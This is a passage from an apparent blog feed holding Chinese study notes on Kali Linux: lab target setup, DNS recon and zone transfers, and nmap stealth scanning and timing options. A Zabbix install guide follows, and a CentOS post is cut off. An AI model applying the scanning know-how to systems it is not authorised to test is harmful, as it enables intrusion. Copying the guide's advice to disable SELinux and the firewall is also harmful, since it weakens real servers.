"blue">软件包的安装</font><br></h4><p>安装完成后，总需要微微的配置一下个人设置，让这台终端有一些你的记号，才会有一种归属感。<br>Kali是基于Debian开发的系统，所以在软件源和安装上，Kali使用的是和Debian一样的APT软件包管理工具和dpkg软件包管理器。<br>apt 命令也不过多赘述，参考Linux--CentOS 或是 Linux--Ubuntu。这里列出几个常用的命令仅供参考：<br><code># apt-get install /package name/ </code> 安装<br><code># apt-get update </code> 更新软件源和软件库<br><code># apt-get upgrade</code> 升级kali软件<br><code># apt-get dist-upgrade</code> kali版本升级<br><code># apt-get remove /package name/</code> 卸载<br><code># apt-get autoremove</code> 自动移除不需要的软件包。<br><code># apt-get purge /package name/</code>完全移除（包括依赖软件包）<br><code># apt-get clean [all]</code> 清理下载的软件包<br><img src="/img/006IjVYfgy1fxurhy1rahj30kk0dwwjb.jpg" alt=""><br>dpkg 使用方法同 rpm 一样，只不过dpkg 是针对.deb的软件包。在Kali内，是不支持rpm(red hat package)的。<br>dpgk的部分常用参数也列在此处供参考：<br><code>dpkg -i </code>安装<br><code>dpkg -r </code>卸载<br><code>dpkg -P </code>完全移除<br><code>dpkg -l </code>显示软件状态<br><code>dpkg -p </code> 详细信息<br>还有一种使用 tar 安装的方式，和其他系统下 tar 的安装无差异。</p><p>有时系统提供的官方库没有我们需要的软件，与要自己手动更换软件源：<br><code>vim /etc/apt/sources.list</code><br>将源添加在文件的尾部:<br><code>deb http://http.us.debian.org/debianstable main contrib non-free</code></p><p>保存后apt-get update 更新即可。</p><h4 id="font-color-blue-KaLi网络-基本服务-font-br"><font color = "blue">KaLi网络&amp;基本服务</font><br></h4><h5 id="b-网络-b"><b>网络</b></h5><p>Kali的网络配置也和Debian基本相同，配置文件位于 /etc/network/interfaces。其DNS文件位于 /etc/resolv.conf<br>虚拟机内我们为了方便基本操作使用DHCP分配一个IP即可。（后续还是使用静态较好...这东西的动静太大了）</p><p>学习一个大佬的小习惯：插网线前断掉网卡,避免多余的通信。<br>在GUI界面直接配置Network Connections可以起到同样的作用。</p><h5 id="b-服务-b"><b>服务</b></h5><p>kali自带一个简易的apache web服务。<br>同样我们可以通过GUI界面和命令行界面启动。<br>GUI的启动方法...自己在开始菜单里面找一找吧...因该有的...（书上是这么的写的...ಠ_ಠ）<br>命令行操作:<br><code># /etc/init.d/apache2 start</code> 启动<br><code># /ect/init.d/apache2 stop</code> 停止<br><code># /ect/init.d/apache2 restart</code> 重启<br>配置文件位置：<br><code># /etc/apache2/apache2.conf</code><br>出现错误时查日志修改配置文件。<br>成功启动后访问kali的ip可以看到熟悉的页面<br><img src="/img/006IjVYfgy1fxusyf6ebej30zq0haq4p.jpg" alt=""></p><p>同时kali提供SSH服务。<br>命令行操作:<br><code># /etc/init.d/ssh start</code> 启动<br><code># /ect/init.d/ssh stop</code> 停止<br><code># /ect/init.d/ssh restart</code> 重启</p><p>一般为了方便我们还要搭建以下FTP服务。<br>可以安装的FTP服务很多，例如VSFTP、Pure-FTPd等</p><h3 id="b-0x03-靶机环境搭建-b"><b>0x03- - 靶机环境搭建<b></h3><p>武器准备的差不多了，我们需要找两个“受害者”了。<br>心中铭记社会主义核心价值观的我，怎么可能会攻击别人的主机呢？（网络安全法了解一下）就自己造两个“稻草人”来作为“受害者”。Σ(*ﾟдﾟﾉ)ﾉ</p><p>win下当然就是VM跑起来挂着就好了。<br>Linux下可以使用docker模拟多台靶机。</p><p>安装的系统可以使用Rapid7 / Metasploitable2<br>/SamuraiWTF/BWA</p><p><a href="http://sourceforge.net">Metasploitable2 官网</a></p><p>下载完成后直接扔虚拟机。<br>登录:用户、密码都是msfadmin。<br>访问其IP如下图：<br><img src="/img/006IjVYfgy1fxuzee0cakj30if0dlglj.jpg" alt=""><br>Metasploitable 还包含：</p><ol><li>1.phpMyAdmin：一个基于php的数据库图形化管理界面</li><li>2.Mutillidate：Metasploitable内置的可能已经过期，可以访问<a href="http://sourceforge.net/projects/mutillidate">最新参考资源</a><br><a href="http://www.youtube.com/user/webpwnized">参考视频</a></li><li>3.WebDAV：这是一个HTTP协议栈的扩展。<a href="http://www.webdav.com">更多信息</a></li><li>4.DVWA：这个就不多说了，参见另一篇通关文章：</li><li>5.Twiki：一款企业及的web2.0应用程序的Wiki和Web前端协作。</li></ol><p>训练库MCIR(Maglcal Code Injection Rainbow)<br>MCIR包含以下几个模块：</p><ol><li>1.SQLol</li><li>2.XMlmao</li><li>3.shelol</li><li>4.XSSmh</li><li>5.CryptOMG</li></ol><p><a href="http://github.com/SpiderLabs/MCIR">More</a></p><p>可以在 matoploitable2 下安装MCIR<br>下载MCIR源码:</p><p><code>wget https://codeload.github.com/SpiderLabs/MCIR/zip/master</code></p><p>我没有成功，由于什么ssl错误...直接去他的github上把源码包撸下来扔到虚拟机里，效果一样的。<br>扔进去之后解压：</p><p><code>unzip master</code></p><p>把解压后的文件夹拷贝到apache目录下</p><p><code>sudo mv MCIR-master /var/www/mcir</code><br>之后还要修改一下mcir的主界面，创建一个入口</p><p><code>cd /var/www</code><br><code>sudo vim index.php</code></p><p>将mcir的连接写入web列表中</p><p><img src="/img/006IjVYfgy1fxv1cijp5wj30mt0dpdfq.jpg" alt=""></p><p>之后访问IP如下:</p><p><img src="/img/006IjVYfgy1fxv16m9vn8j30po0e4mx4.jpg" alt=""></p><p>点击我们创建的入口连接：</p><p><img src="/img/006IjVYfgy1fxv1bsy9m6j30pe0dw74j.jpg" alt=""></p><p>到此，靶机的安装先告一段落。</p><h3 id="b-0x04-渗透测试流程-b"><b>0x04- - 渗透测试流程<b></h3><p>在这一部分，想规范化一下渗透测试的五个标准流程。<br>该框架为渗透测试人员提供了一个较为完备的渗透体系，同时也用于为渗透测试活动形成更高等级的计划。<br>一个比较通用的定义为：一个渗透测试的生命周期分为五个阶段：</p><ol><li><b>1.侦查</b></li><li><b>2.扫描</b></li><li><b>3.渗透</b></li><li><b>4.维持访问</b></li><li><b>5.报告</b></li></ol><p>因为这篇博客主角为KaLi,所以在此仅记录KaLi下的这五部分的工具。</p><h4 id="font-color-blue-1-侦查-font-br"><font color = "blue">1.侦查</font><br></h4><blockquote><p>知己知彼，百战不殆</p></blockquote><p>什么是侦查？所有有关渗透学习的资料的第一章必定都是侦查。个人认为，就是利用一切可以搜集到与目标有关或者间接有关的信息的方法，进行信息搜集。例如我们所熟悉的：Google、百度。<br>本阶段的目标是找出关于组织机构尽可能多的信息。</p><ul><li>· 组织架构，组织结构图，部门架构图等</li><li>· 组织基础设施：IP地址和网络拓扑</li><li>· 使用技术：硬件平台和服务软件包</li><li>· 联系方式：员工邮箱地址、手机号码</li><li>· 地理位置：组织设施的地理位置</li></ul><p>首先从目标网站开始：自身的门户网站往往包含了大量的高价值信息；其次招聘信息的页面也往往能够透露出目标所使用的技术；每一个站点都要进行webmail的连接，并进行评估。</p><h5 id="wget-工具">wget 工具</h5><p>我们可以通过wget工具对网站进行下载离线镜像。<br>wget只能获取所有的html页面，而不能获取PHP教本页面。<br>具体参数参考手册。</p><h5 id="Google-Google-Hacking">Google &amp;Google Hacking</h5><p><a href="http://www.google.com/advanced_search">Google 的高级搜索页</a><br><a href="http://www.hackerforcharity.org/ghdb">Google Hacking 数据库(GHDB)</a><br><a href="http://www.offensive-security.com/community-projects/google-hacking-database/">阅读《Google Hacking for Penetration Testers》</a></p><p>P.S:有时间关注一下LinkedIn</p><h5 id="DNS-DNS攻击">DNS/DNS攻击</h5><h5 id="查询域名服务器-nslookup">查询域名服务器/-/-nslookup</h5><p>nslookup 工具可以用于域名服务器查询。<br>在kali终端直接输入nslookup，即可进入该工具命令模式。<br>输入一个域名，即可向本地域名服务器查询这个域名的权威应答和非权威应答服务器。<br>nslookup 通过分配给本机的域名服务器进行查询。可用server参数进行查看：</p><p><code>nslookup </code><br><code>&gt; server</code></p><p>nslookup还可以限定查询服务器类型：<br><code>&gt; set type = MX</code> 特定查询邮件服务器<br><code>&gt; google.com</code>  查询的域名<br>本地域名服务器配置文件即DNS解析文件。</p><p>/etc/resovle.conf</p><p>nslook常见主要记录类型：</p><table><thead><tr><th style="text-align:left">Record Type</th><th style="text-align:left">Default Port</th><th style="text-align:left">Server Type</th></tr></thead><tbody><tr><td style="text-align:left">mx</td><td style="text-align:left">25</td><td style="text-align:left">Mail</td></tr><tr><td style="text-align:left">txt</td><td style="text-align:left">n/a</td><td style="text-align:left">Text message used for notes</td></tr><tr><td style="text-align:left">ns</td><td style="text-align:left">53</td><td style="text-align:left">Name Server</td></tr><tr><td style="text-align:left">cname</td><td style="text-align:left">n/a</td><td style="text-align:left">Alias for another server</td></tr><tr><td style="text-align:left">aaaa</td><td style="text-align:left">n/a</td><td style="text-align:left">IPversion 6</td></tr><tr><td style="text-align:left">a</td><td style="text-align:left">n/a</td><td style="text-align:left">Domain or Sub-Domain record</td></tr></tbody></table><h5 id="区域传输">区域传输</h5><p>区域传输可以在短时间内获取更多的信息。<br>区域传输是完全镜像一台服务器的所有信息，在配置不当的服务器上不但授权更新客户端的区域传输，还准许传输请求。<br>我们使用 Domain Internet Gopher (DIG) 程序进行区域传输：<br><code>dig @ [nameserver][domain] axfr</code><br>一般域名服务器会拒绝这个请求，当域名服务器配置不当时，完整的域名服务器记录将会被传输到本地Kali，域名应该是最小域名。axfr参数表示dig应请求一个区域传输操作。</p><h4 id="font-color-blue-2-扫描-font-br"><font color = "blue">2.扫描</font><br></h4><p>我们再打个形象的比喻：这个比喻是在《黑客秘籍--渗透测试指南》一书中，全书将渗透测试比喻做一场足球赛：如果说侦查是在赛前对对手的球队有哪些球员等信息进行搜集，那么扫描就是正式比赛开始的哨声。</p><p>扫描的主要目的是确定连接组织网络中的计算机和其他设备的指定信息。在本阶段中，目标就是找到所有的主机终端、确认操作系统以及开启的服务、甚至发现较为明显的漏洞。</p><p>常见的扫描工具：Nmap、Hping、Nessus。</p><p>进行这一部分之前，需要对网络的几个基础知识有一定的了解：网络流量、端口、防火墙、IP协议、TCP协议、UDP协议，ICMP等。<br>参考CSDN上的部分博文吧。</p><p><font color = "red">新增加一个命令：tracert(for Win)/traceroute(for Linux)。</font><br>关于这个东西的理解还不是很深刻，后续在计网里补一下。</p><h5 id="Nmap">Nmap</h5><p>简单的使用过这个工具，现在详细的学习一下这个工具的功能。</p><p>最初接触 Nmap 是用于端口扫描。真正仔细的学习时候发现Nmap好强大啊。<br>Nmap不仅可以确认目标网络上的计算机存活状态，大多数情况还能拿到主机的操作系统、监听的端口、服务、甚至用户证书。<br>Nmap的命令非常灵活。用一个普通的命令为例：<br><code># nmap -sS-T2 192.168.1.1 -oN</code></p><blockquote><p>-sS 表示以隐蔽的方式扫描<br>-T2 是计时选项，他告诉引擎需要产生多大的流量，以及产生的时间。直接的影响了扫描速度<br>ip 这个就不用说了，目标地址<br>-oN 是输出选项，他告诉程序把扫描结果输出到哪里</p></blockquote><p>简单的，我们在kali下用nmap试探一下搭建好的靶机--Metaploitable</p><p><code># nmap 192.168.230.137</code></p><p>在不设置参数的时候，Nmap会对目标进行一次隐蔽扫描，T3模版，并输出到控制台。</p><p><img src="/img/006IjVYfgy1fxy8utnyblj30uu0k9wob.jpg" alt=""></p><p>下面分别介绍三个参数的更多命令：</p><p><b>-sS</b><br>发起一次隐蔽扫描，这也是nmap的默认扫描方式。为什么能做到隐秘扫描呢？隐秘扫描时nmap会向目标服务器发送一次TCP的SYN请求，之后服务器对应的回复SYN/ACK后，扫描引擎不会再去确认它。这样就无法构成三次的过程，也就是无法形成TCP通道，大多数系统都会在这之后的一段时间内自动关闭该链接,从而达到隐秘扫描的目的。</p><p><b>-sT</b><br>发起一次TCP连接扫描。这会建立起一个完整的TCP连接，同时也会获取到更多的信息。</p><p><img src="/img/006IjVYfgy1fxy8vuooanj30pz0g0gsd.jpg" alt=""></p><p><b>-sU</b><br>发起一次UDP扫描。UDP扫描会期望收到已经关闭端口的系统应答，而发送到开放的UDP端口的数据包不会被响应。<br>这个扫描方式的速度非常缓慢。</p><p><img src="/img/006IjVYfgy1fxy9ucsye8j30jn07j40z.jpg" alt=""></p><p><b>-sA</b><br>发起一次ACK扫描，可以用于TCP端口是否被过滤的检测。这种扫描会对会主机发起一个标记为ACK的通信。这种扫描有时候可以绕过防火墙（伪装成内网的TCP请求）。</p><p><img src="/img/006IjVYfgy1fxy9v4kcgzj30gd040gmu.jpg" alt=""></p><p><b>-sP</b><br>通过ICMP ping来获取网络中存活主机。</p><p><b>-Pn/-PU</b><br>不采取ICMP,对开放的Udp端口进行存活确认。</p><p><b>-sn</b><br>仅探测存活主机</p><p><b>-p</b><br>选定要扫描的端口号范围。</p><p><b>-O/-A</b><br>识别操系统<br><b>timing模版</b><br>nmap的模版一共有5级：T0-T5,从低到高隐秘性与准确性降低，速度加快。<br>nmap有三个时间参数：scan_delay、max_scan_delay、max_parallelism。</p><p>scan_delay设置了两次探测之间的最小时间差，max_scan_delay根据目标和网络设置调整扫描器允许的扫描器延时的最大值，max_parallelism设置告诉扫描器是串行探测还是并行探测。</p><p><b>-T0 Paranoid</b><br>这个模版被用于慢速的网络连接。或者必须最小化发现风险的环境。<br>扫描类型为串行，扫描时间间隔最少是五分钟，max_scan_delay会被忽略。<br>这个选项智慧早急需隐蔽或是时间充裕下选择。</p><p><b>-T1 Sneaky</b><br>这个模版是基于T0的一些优化。他的速度会比T0块，同时保持了慢速扫描固有的隐蔽性。<br>扫描类型依旧为串行，scan_delay值为15s。</p><p><b>-T2 Polite</b><br>扫描速度继续加快，依旧使用串行方式，scan_delay值为400ms,max_scan_delay为1分钟。</p><p><b>-T3 Normal</b><br>这个模版是nmap默认扫描方式的模版，当我们不设置timing参数时会默认使用这个模版的设置。<br>从T3开始扫描方式切换为并行，scan_delay为0s，max_scan_delay为1s。</p><p><b>-T4 Aggressive</b><br>速度继续增加，scan_delay为0s，max_scan_delay为10ms。在一些响应探针的时间间隔最小为1s的操作系统上很容易出错。</p><p><b>-T5 Insane</b><br>最快的内置模版，并行扫描 + scan_delay为0秒 + max_scan_delay = 5ms。<br>最快可达22s扫描完成，但对于某些主机的操作系统和设置，这个参数可能会导致错误。</p><p><b>IP参数</b><br>对于nmap，IP参数可以是一个固定的地址，或是地址段。<br>地址段支持CIDR寻址方式。<br>同样也可以用一个文件来导入目标地址。</p><p><code># nmap -iL targets.txt</code></p><p><b>-oN 普通输出</b><br>普通输出，创建一个文本文档并写入。</p><p><b>-oX XML输出</b><br>输出格式为XML的文档。</p><p><b>-oG GREPable输出</b><br>适用于GREP工具的文档形式输出。</p><p><b>-oS 脚本式输出</b></p><p><b> --script 脚本引擎</b><br>nmap同时也支持使用脚本引擎进行扫描。<br><a href="http://nmap.org/nsedoc/">更多信息</a></p><h5 id="Hping3">Hping3</h5><p>这是一个可以手动制作数据包并发送到网络的应用程序。<br>更多参数在 -h 选项中可以看到</p><h5 id="Nessus">Nessus</h5><p>这是一个漏洞扫描的应用程序,Kali内未内置，需要自行安装一下。<br>从 <a href="http://www.nessus.org/download">Nessus</a> 下载<br>完成后dpkg安装即可。</p><p>启动Nessus：<br><code># /etc/init.d/nessusd start</code><br>启动成功后，打开本地浏览器：<code>http://localhost:8834/</code> 进入设置页面。</p><p>可以去官网注册一个免费版的帐号，好像需要科学上网。</p><p>验证完成会开始下载。之后进行初始化的设置。</p><p>设置好登录帐号和密码，即可进入控制台。</p><p>关于Nessus的使用，可以列为一篇新的文章了。这里不再过多的描述了。</p><h4 id="font-color-blue-3-渗透-font-br"><font color = "blue">3.渗透</font><br></h4><p>首先要对几个名词性概念进行了解：<br>漏洞：存在于信息系统、系统安全规程、内部控制和实现中，并可能被外部威胁源所利用的弱点。<br>漏洞是由错误产生的，这个错误可以存在于多个地方。<br>渗透就是要利用各种漏洞进行越权访问信息或者造成拒绝服务（DOS）。<br>攻击向量：我的理解是攻击的主要思路，也就是攻击的大方向。<br>攻击类型：每种不同的大方向下会存在各种各样的小类型,也就是具体的攻击手段。</p><table>    <tr>        <td>攻击向量</td>         <td>攻击类型</td>    </tr>    <tr>        <td rowspan="4">Code Injection</td>            <td >缓冲区溢出</td>      </tr>    <tr>        <td >缓冲区欠载（buffer underrun)</td>      </tr>    <tr>        <td >病毒</td>      </tr>    <tr>        <td >恶意软件</td>      </tr>    <tr>        <td rowspan="4">Web Based</td>            <td >篡改</td>      </tr>    <tr>        <td >跨站脚本公积（XSS）</td>      </tr>    <tr>        <td >跨站请求伪造（XSRF）</td>      </tr>    <tr>        <td >SQL注入</td>      </tr>     <tr>        <td rowspan="4">Network Based</td>            <td >拒绝服务攻击（DoS）</td>      </tr>    <tr>        <td >分布式拒绝服务攻击（DDoS）</td>      </tr>    <tr>        <td >密码和敏感数据拦截</td>      </tr>    <tr>        <td >证书盗窃和伪造</td>      </tr>    <tr>        <td rowspan="4">Social Engineering</td>            <td >身份伪造</td>      </tr>    <tr>        <td >网络钓鱼</td>      </tr>    <tr>        <td >鱼叉式网络钓鱼</td>      </tr>    <tr>        <td >情报搜索</td>      </tr></table><p>Kali在渗透这一步主要使用 Metasploit ，单独在另一个文章内陈述。<br>这里只介绍部分Web渗透的工具。</p><h4 id="参考链接">参考链接</h4><blockquote><p>0.官网 : <a href="http://www.kali.org/">http://www.kali.org/</a><br>1.Metasploitable2 官网 : <a href="http://sourceforge.net">http://sourceforge.net</a><br>2.最新参考资源 : <a href="http://sourceforge.net/projects/mutillidate">http://sourceforge.net/projects/mutillidate</a><br>3.参考视频 : <a href="http://www.youtube.com/user/webpwnized">http://www.youtube.com/user/webpwnized</a><br>4.更多信息 : <a href="http://www.webdav.com">http://www.webdav.com</a><br>5.More : <a href="http://github.com/SpiderLabs/MCIR">http://github.com/SpiderLabs/MCIR</a><br>6.Google 的高级搜索页 : <a href="http://www.google.com/advanced_search">http://www.google.com/advanced_search</a><br>7.Google Hacking 数据库 : GHDB]<br>8.阅读《Google Hacking for Penetration Testers》 : <a href="http://www.offensive-security.com/community-projects/google-hacking-database/">http://www.offensive-security.com/community-projects/google-hacking-database/</a><br>9.更多信息 : <a href="http://nmap.org/nsedoc/">http://nmap.org/nsedoc/</a><br>10.Nessus : <a href="http://www.nessus.org/download">http://www.nessus.org/download</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;Linux--KaLi&lt;/h1&gt;
&lt;h3 id=&quot;b-0x00-前言-b&quot;&gt;&lt;b&gt;0x00- - 前言&lt;b&gt;&lt;/h3&gt;
&lt;p&gt;咳咳,一直想要把KaLi里面的东西好好的整理一下，毕竟能省去很多复杂的操作时间。（其实就是图书馆借的书马上得换了赶紧翻两页写个笔记好了Orz...</summary>
      
    
    
    
    <category term="Operation" scheme="http://blog.dvkunion.cn/categories/Operation/"/>
    
    
    <category term="操作系统" scheme="http://blog.dvkunion.cn/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Linux" scheme="http://blog.dvkunion.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>zabbix</title>
    <link href="http://blog.dvkunion.cn/2018/11/03/zabbix/"/>
    <id>http://blog.dvkunion.cn/2018/11/03/zabbix/</id>
    <published>2018-11-03T19:35:48.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<div id="head"></div><h1>Zabbix</h1><hr><div id="0x00"></div><h3 id="b-0x00-Zabbix-简介-b"><b>0x00- - Zabbix 简介<b></h3><h4 id="font-color-blue-Zabbix-起源-font-br"><font color = "blue">Zabbix 起源</font><br></h4><p>Zabbix 是一个由Alexei Vladishev创建，目前由Zabbix SIA在持续开发和支持的<b><i>企业级、分布式、开源且高度集成</i></b>的监控套件。<br>Zabbix 是一个通过 C/S 模式采集数据,通过 B/S 模式在WEB界面展示，所有的Zabbix报告都可以通过配置参数在WEB前端进行访问。基于Web的前端页面可以确保您从任何方面评估您的网络状态和服务器的健康性。<br>Zabbix使用灵活的通知机制，允许用户为几乎任何事件配置基于邮件的告警。这样可以快速反馈服务器的问题。适当的配置后，Zabbix可以在IT基础架构监控方面扮演重要的角色。</p><h4 id="font-color-blue-Zabbix-特性-font-br"><font color = "blue">Zabbix 特性</font><br></h4><p>通过 Zabbix 可以实现：</p><ul><li>数据收集</li><li>高级警告</li><li>实时绘图</li><li>存储历史数据</li></ul><p>Zabbix 的优点：</p><ul><li></li><li></li><li></li></ul><p>Zabbix 的缺点：</p><ul><li></li><li></li><li></li></ul><h3 id="b-0x01-Zabbix-结构概述-b"><b>0x01- - Zabbix 结构概述<b></h3><p><img src="/img/4c06e311gy1fwztd037h7j20hm0daq48.jpg" alt=""></p><p>Zabbix由几个主要的软件组件构成，这些组件的功能如下：</p><p><b>Server</b>——Zabbix server 是agent程序报告系统可用性、系统完整性和统计数据的核心组件，是所有配置信息、统计信息和操作数据的核心存储器。</p><p><b>数据库存储</b>——所有配置信息和Zabbix收集到的数据都被存储在数据库中。</p><p><b>Web界面</b>——基于Web的Zabbix界面。该界面是Zabbix Server的一部分，通常(但不一定)跟Zabbix Server运行在同一台物理机器上。</p><p><b>Proxy代理服务器</b>——Zabbix proxy 可以替Zabbix Server收集性能和可用性数据。Proxy代理服务器是Zabbix软件可选择部署的一部分；当然，Proxy代理服务器可以帮助单台Zabbix Server分担负载压力。</p><p><b>Agent监控代理</b>——Zabbix agents监控代理 部署在监控目标上，能够主动监控本地资源和应用程序，并将收集到的数据报告给Zabbix Server。</p><p><b>数据流</b>——实现监控告警等功能时，控制数据流动的模块。</p><p><img src="/img/4c06e311gy1fwztrh5d6dj20ux0j6n3t.jpg" alt=""></p><h3 id="b-0x02-Zabbix-环境搭建-b"><b>0x02- - Zabbix 环境搭建<b></h3><h4 id="font-color-blue-Zabbix-需求-font-br"><font color = "blue">Zabbix 需求</font><br></h4><h5 id="硬件需求">硬件需求</h5><p>最低配置：128MB内存、256MB硬盘</p><h5 id="软件支持">软件支持</h5><p>Web端：<br>基本Lamp环境：Apache(1.3.12及以上)、Php(5.3.0及以上)、Php扩展(gd &amp; bcmath &amp; ctype &amp; libXML &amp; xmlreader &amp; xmlwriter &amp; session &amp; sockets &amp; mbstring &amp; gettext...)<br>数据库:<br>MySQL：5.0.3及以上<br>Oracle：10g及以上<br>PostgreSQL：8.1及以上</p><h4 id="font-color-blue-Zabbix-安装-font-br"><font color = "blue">Zabbix 安装</font><br></h4><h5 id="Server端">Server端:</h5><ol><li><b>1.更新软件源</b><br><code>$ rpm -ivh http://repo.zabbix.com/zabbix/3.4/rhel/7/x86_64/zabbix-release-3.4-1.el7.centos.noarch.rpm</code></li><li><b>2.或者下载后本地解压</b><br><code>$  rpm -ivh zabbix-release-3.4-1.el7.centos.noarch.rpm </code><br>查看/etc/yum.repos.d中有没有zabbix.repo</li><li><b>3.安装Zabbix-Server、mariadb数据库支持</b><br><code>$ yum install -y zabbix-server zabbix-get mariadb-server </code></li><li><b>4.检测是否安装成功</b><br><code>$ rpm -ql zabbix-server-mysql</code><br><code>$ rpm -ql | grep zabbix</code></li><li><b>5.导出数据库 </b><br><code>$ cp /usr/share/doc/zabbix-server-mysql-3.4.14/create.sql.gz /root/Desktop/</code><br>解压<br><code>gunzip /root/Desktop/create.sql.gz</code></li><li><b>6.开启数据库服务</b><br>将数据库服务设置为开机启动<br><code>$ systemctl enable mariadb.service </code><br>启动数据库服务<br><code>$ systemctl start mariadb.service </code></li><li><b>7.配置数据库</b><br>启动数据库<br><code>$ mysql -uroot -p</code><br>建表<br><code>mariadb-&gt; create database zabbix charset 'utf8';</code><br>创建用户<br><code>mariadb-&gt; grant all on zabbix.* to zabbix@'localhost' identified by 'redhat';</code><br>刷新<br><code>mariadb-&gt; flush privileges;</code><br>导入数据表<br><code>$ mysql -uroot -p zabbix &lt; /root/Desktop/create.sql</code></li><li><b>8.配置config文件</b><br><code>$  vim /etc/zabbix/zabbix_server.conf</code></li></ol><ul><li>(1)修改内容：</li></ul><blockquote><p>12行  ListenPort=10051 #监听端口<br>19行  SourceIP=192.168.142.130  #设为服务器ip地址<br>38行  LogFile=/var/log/zabbix/zabbix_server.log<br>49行  LogFileSize=10<br>72行  PidFile=/var/run/zabbix/zabbix_server.pid<br>82行  SocketDir=/var/run/zabbix<br>91行  DBHost=localhost #因为此次实验数据库就装在服务器端，否则应设为数据库服务器的ip地址<br>117行 DBUser=zabbix<br>101行 DBName=zabbix<br>125行 DBPassword=redhat<br>132行 DBSocket=/var/lib/mysql/mysql.sock<br>140行 DBPort=3306</p></blockquote><ul><li>(2)重启服务：<br><code>$ systemctl restart zabbix-server.service</code></li></ul><ol start="9"><li><b>9.安装Web端</b><br><code>$ yum install -y zabbix-web zabbix-web-mysql httpd php php-mysql php-mbstring php-gd php-bcmath php-ldap php-xml</code><br>修改/etc/php.ini配置文件<br><code>$ vim /etc/php.ini</code></li></ol><ul><li>(1)修改内容--更改时区</li></ul><blockquote><p>878行 date.timezone =Asia/Shanghai #设置时区</p></blockquote><ul><li>(2)开启服务<br><code>$ systemctl status httpd</code><br><code>$ systemctl start httpd</code></li><li>(3)访问:<br>IP/zabbix<br><img src="/img/4c06e311gy1fwzv5h8lvpj20qg0fqab7.jpg" alt=""><br>web界面初始化配置保存在/etc/zabbix/web/zabbix.conf.php<br>web登录界面 admin/zabbix</li></ul><ol start="10"><li><b>10.注意</b></li></ol><ul><li>(1)关闭selinux<br><code>$ getenforce</code><br><code>$ vim /etc/sysconfig/selinux</code><br>将其改为disabled</li><li>(2)关闭防火墙<br><code>$ systemctl status firewalld.service</code><br><code>$ systemctl stop firewalld.service</code><br><code>$ systemctl disable firewalld.service</code></li></ul><h5 id="Client端">Client端:</h5><ol><li><b>1.安装Zabbix-Agent</b><br><code>$ rpm -ivh http://repo.zabbix.com/zabbix/3.4/rhel/7/x86_64/zabbix-release-3.4-1.el7.centos.noarch.rpm</code><br><code>$ yum install -y zabbix-agent zabbix-sender</code></li><li><b>2.配置文件</b><br><code>$ vim /etc/zabbix/zabbix_agentd.conf</code></li></ol><blockquote><p>97行， Server=192.168.1.250<br>105行，ListenPort=10050<br>113行，ListenIP=192.168.1.131<br>138行，ServerActive=192.168.1.250<br>149行，Hostname=192.168.1.131<br>187行，RefreshActiveChecks=60</p></blockquote><ol start="3"><li><b>3.启动服务</b><br><code>$ systemctl enable zabbix-agent.service</code><br><code>$ systemctl start zabbix-agent.service </code></li><li><b>中文界面乱码</b></li></ol><ul><li>(1)将“控制面板”——“字体”——“微软雅黑”——“微软雅黑 常规” copy 到/usr/share/zabbix/fonts,后缀改成ttf</li><li>(2)<code>$ vim /usr/share/zabbix/include/defines.inc.php</code><br>line54 define('ZBX_GRAPH_FONT_NAME', 'MSYH');<br>line103 define('ZBX_FONT_NAME', 'MSYH');</li><li>(3)刷新web界面</li></ul><h3 id="b-0x03-Zabbix-使用-b"><b>0x03- - Zabbix 使用<b></h3>]]></content>
    
    
      
      
    <summary type="html">&lt;div id=&quot;head&quot;&gt;&lt;/div&gt;
&lt;h1&gt;Zabbix&lt;/h1&gt;
&lt;hr&gt;
&lt;div id=&quot;0x00&quot;&gt;&lt;/div&gt;
&lt;h3 id=&quot;b-0x00-Zabbix-简介-b&quot;&gt;&lt;b&gt;0x00- - Zabbix 简介&lt;b&gt;&lt;/h3&gt;
&lt;h4 id=&quot;font-color</summary>
      
    
    
    
    <category term="Tools" scheme="http://blog.dvkunion.cn/categories/Tools/"/>
    
    
    <category term="运维" scheme="http://blog.dvkunion.cn/tags/%E8%BF%90%E7%BB%B4/"/>
    
    <category term="管理工具" scheme="http://blog.dvkunion.cn/tags/%E7%AE%A1%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Linux--CentOS</title>
    <link href="http://blog.dvkunion.cn/2018/10/20/Linux-CentOS/"/>
    <id>http://blog.dvkunion.cn/2018/10/20/Linux-CentOS/</id>
    <published>2018-10-20T15:49:33.000Z</published>
    <updated>2023-11-03T21:25:20.032Z</updated>
    
    <content type="html"><![CDATA[<h1>Linux--CentOS7.0</h1><p><i>2018-12-20</i><br>趁着这一阶段系统性的把 Linux 的操作记录一下。<br>结合着 《鸟哥私房菜》 以及学习的知识进行一个系统性的总结。<br>关于 Linux，我目前的感受是----</p><ul><li>在没碰过Linux系统时，用Ubuntu桌面化都觉得：这是个什么鬼玩意？</li><li>用了一阵之后，记不住杂多命令的我：为什么会有人觉得这种东西会比图形化的win好？</li><li>习惯了以后：Linux 真香，来一口老弟，来一口。<br>总的来说Linux的管理和操作还是较清晰化和便捷的，至少对于我这种强迫症感觉文件的存放和分类都好清爽啊orz...</li></ul><p><i>2018-12-20</i></p><p>贴一个有趣的讲解：<br><a href="http://mp.weixin.qq.com/s?__biz=MzA4ODIwMDUyNw==&amp;mid=2652994636&amp;idx=2&amp;sn=1f3b66c94de485c35b717c2295a196d5&amp;chksm=8bf8186cbc8f917a241b0724dffb618547326cda89199d7a4b8cd14326f987b5189ba9335139&amp;mpshare=1&amp;scene=24&amp;srcid=#rd">有趣的命令</a><br><a href="http://mp.weixin.qq.com/s?__biz=MzA4ODIwMDUyNw==&amp;mid=2652994485&amp;idx=1&amp;sn=7999fb43eca8f3c1eadb1a02475aa4b5&amp;chksm=8bf81f95bc8f96831c00e6d780c06c104b8316fd8696d7134222850dc5ba1d2380d558e33774&amp;mpshare=1&amp;scene=24&amp;srcid=#rd%22">漫画讲解Linux内核</a></p><p>目录:</p><ul><li>0x01 Linux简介</li><li>0x02 Linux简单命令</li><li>0x03 用户和权限管理</li><li>0x04 vim使用</li><li>0x05 网络配置</li></ul><h2 id="b-0x01-Linux简介-b"><b>0x01- - 